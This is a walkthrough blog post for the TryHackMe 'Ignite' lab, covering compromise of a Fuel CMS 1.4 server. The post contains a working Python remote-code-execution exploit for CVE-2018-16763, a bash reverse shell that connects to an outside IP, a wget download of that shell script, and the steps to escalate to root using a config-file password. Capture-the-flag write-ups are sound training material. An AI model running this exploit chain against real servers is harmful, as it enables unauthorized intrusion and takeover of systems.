---
title: 'Ignite - TryHackMe Walkthrough'
date: 2020-07-12 00:00:00
featured_image: '/images/posts/ignite-thm.png'
excerpt: A new start-up has a few issues with their web server.
---
![](/images/posts/ignite-thm.png)

## Goal
To exploit a mis-configured webserver running CMS and then gain the root access.

### Recon
When visited the default webpage that is running on the host, shows the Fuel CMS (Ver 1.4) was installed but not configured.
The page has next steps to do by the system administrator and at the end of the page it has the default credentials to login, admin:admin.

Performed a scan on the host with `nmap` :
```bash
$ nmap -p- -A 10.10.142.89
Nmap scan report for 10.10.142.89
Host is up (0.20s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

The Fuel CMS 1.4 has a known vulnerability [CVE-2018-16763](https://www.exploit-db.com/exploits/47138).

### Getting a reverse shell
Using exploit from [exploit database](https://www.exploit-db.com/raw/47138), tweaked a bit and created a file remoteattack.py.  
The exploit will prompt for a command to execute on the victim.

```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://10.10.142.89"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = input('cmd:')
    url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
    r = requests.get(url)

    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)

    print(r.text[0:dup])
```
Test the exploit by running a sample remote command, like id, pwd etc.

```bash
$ python3 remoteattack.py
cmd:pwd
system/var/www/html
```
From above we can see the exploit is working, so we extend this to get a reverse shell to do more.

- Created a bash script file with revere shell code, revshell.sh

```bash
$cat revshell.sh
bash -i >& /dev/tcp/10.2.18.4/4444 0>&1
```
- Open a simple http server using `python -m http.server` from the same location, so the victim can download the file.
- Open a `nc` listener on port 4444; `nc -nlvp 4444`
- Run the exploit again, but this time the command is to download the reverse shell code.

```bash
$ python3 remoteattack.py
cmd:wget http://10.2.18.4:8000/revshell.sh
```
- Pass the cmd to execute the revshell.sh

```bash
$ python3 remoteattack.py
cmd:bash revshell.sh
```
- This will establish a reverse shell connection on `nc` listener and with the user *www-data*.
- The user flag can be accessible from `/home/www-data/flag.txt` which has a value: `6470e394cb--------1682cc8585059b`

### Escalating the privileges to root
- The user www-data is a normal user and we need to escalate our privileges to root.
- Using the [linPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh), lets see if there are any mis-configurations on the server.
- Download the linPEAS.sh utility to /tmp of the victim and execute it.
- Once the report is generated, go through it and under the section, "Finding pwd or passw variables", we can see there is configuration file, `fuel/application/config/database.php` with password *mememe*. The same file we can saw on the webpage during Recon also with the instructions to install the database for Fuel CMS.
- Bu going through the configuration file, we can see the above password is for the root id.
- Switch to root user using the above password and access the root flag, /root/root.txt; which has the value *b9bbcb33--------759c4e844862482d*.

Image Credits: [TryHackMe and the room creator](https://tryhackme.com/room/ignite).
